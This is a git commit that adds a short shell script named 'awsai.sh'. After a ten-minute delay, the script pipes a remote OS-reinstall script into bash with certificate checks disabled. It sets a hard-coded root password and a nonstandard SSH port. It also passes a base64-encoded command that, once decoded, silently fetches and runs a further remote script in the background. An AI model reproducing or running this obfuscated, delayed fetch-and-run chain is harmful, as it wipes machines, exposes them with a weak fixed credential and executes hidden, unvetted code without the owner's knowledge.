9c116a2d9ed54a326e5a611b21f914eb1590e557
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-05-11 12:43:26 +0800

    Add files via upload

---
+++ awsai.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+sleep 600
+
+bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ls.123456" -port 2233 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jdXJpb3NpdHlpbnRlcmlvcnN1ay8yMDg4L21haW4vemg4OGtrMi5zaCkgPj4vZGV2L251bGwgMj4mMSAmCg=="
